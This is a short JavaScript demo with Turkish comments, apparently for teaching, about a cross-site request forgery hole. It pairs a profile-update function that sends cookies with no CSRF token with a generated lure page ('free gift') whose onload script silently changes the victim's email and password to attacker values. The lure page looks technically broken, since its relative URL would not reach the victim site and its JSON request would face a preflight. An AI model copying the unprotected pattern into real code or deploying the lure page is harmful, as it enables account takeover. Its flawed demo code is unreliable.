// Güvenlik Açığı İçeren CSRF Örneği

// Kullanıcı hesap bilgilerini güncelleme fonksiyonu
function updateUserProfile(userId, newEmail, newPassword) {
    // CSRF Koruması Olmayan Fetch İsteği
    fetch('/api/update-profile', {
        method: 'POST',
        credentials: 'include', // Oturum çerezlerini gönder
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            userId: userId,
            email: newEmail,
            password: newPassword
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Profil güncellendi:', data);
    })
    .catch(error => {
        console.error('Hata:', error);
    });
}

// CSRF Saldırısı için Örnek Zararlı HTML
function generateCSRFAttackPage() {
    return `
    <!DOCTYPE html>
    <html>
    <body>
        <h1>Ücretsiz Hediye Kazandınız!</h1>
        <script>
            // Arka planda kullanıcının hesabını değiştirecek script
            window.onload = function() {
                fetch('/api/update-profile', {
                    method: 'POST',
                    credentials: 'include',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        userId: 'currentUserId', // Mevcut kullanıcı ID'si
                        email: 'hacker@example.com',
                        password: 'hackersNewPassword'
                    })
                });
            }
        </script>
    </body>
    </html>
    `;
}

// CSRF Açığını Gösterme Fonksiyonu
function demonstrateCSRFVulnerability() {
    console.warn('DİKKAT: Bu kod yalnızca eğitim amaçlıdır!');
    console.log('CSRF Güvenlik Açığı Özellikleri:');
    console.log('1. Herhangi bir CSRF token kontrolü yok');
    console.log('2. Kimlik doğrulama mekanizması zayıf');
    console.log('3. Kullanıcı izni alınmadan işlem yapılabilir');
    
    // Potansiyel saldırı senaryosu
    console.log('\nOlası Saldırı Senaryosu:');
    console.log('- Kullanıcı kötü amaçlı bir siteyi ziyaret eder');
    console.log('- Arka planda hesap bilgileri değiştirilir');
    console.log('- Kullanıcıdan habersiz işlem gerçekleşir');
}

// CSRF Açığını Göster
demonstrateCSRFVulnerability();